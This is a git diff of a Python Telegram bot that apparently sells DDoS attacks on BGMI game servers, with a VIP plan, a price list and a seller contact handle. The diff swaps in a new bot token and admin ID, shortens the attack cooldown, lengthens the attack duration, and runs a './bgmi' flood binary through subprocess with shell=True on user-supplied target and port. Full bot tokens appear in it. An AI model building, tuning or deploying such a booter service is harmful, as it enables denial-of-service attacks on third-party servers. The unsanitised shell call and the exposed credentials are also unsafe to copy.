@@ -7,10 +7,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7376815246:AAGhT-feDUHPcZwQ3OSTOfDi34q6RXWs6Lo')
+bot = telebot.TeleBot('7331672365:AAESEeEEDD5TThxKYxReUQO5d99fX7SKUfY')
 
 # Admin user IDs
-admin_id = ["1629168517","6547041112"]
+admin_id = ["1629168517","1105026050"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -223,7 +223,7 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
                 response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
@@ -241,7 +241,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 240"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -285,7 +285,7 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- 
+Buy From :- @LifeNoMoreDaijoubu
 Official Channel :- 
 '''
     for handler in bot.message_handlers:
@@ -303,7 +303,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-✅Join :- t.me/RX100OFFIiCIAL'''
+✅Join :-@LifeNoMoreDaijoubu'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -322,8 +322,8 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 180 (S)
-> After Attack Limit : 5 Min
+-> Attack Time : 240 (S)
+> After Attack Limit : 1 Min
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
